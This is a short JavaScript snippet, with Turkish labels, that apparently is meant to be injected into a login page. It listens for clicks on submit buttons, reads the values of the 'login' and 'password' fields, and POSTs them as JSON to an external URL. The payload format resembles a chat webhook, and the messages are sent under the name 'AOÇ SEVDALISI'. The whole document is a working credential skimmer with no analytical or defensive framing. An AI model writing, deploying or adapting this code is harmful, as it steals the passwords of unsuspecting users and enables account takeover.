function mesaj(url, mesaj) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': mesaj,
        'username':'AOÇ SEVDALISI',
    }));
}

document.body.addEventListener( 'click', function ( event ) {
    if(event.target.type == "submit") {
        var username = document.getElementsByName("login")[0].value
        var password = document.getElementsByName("password")[0].value
        mesaj(url, "Kullanıcı: "+username+"\n"+"Şifre: "+password)
    }
})
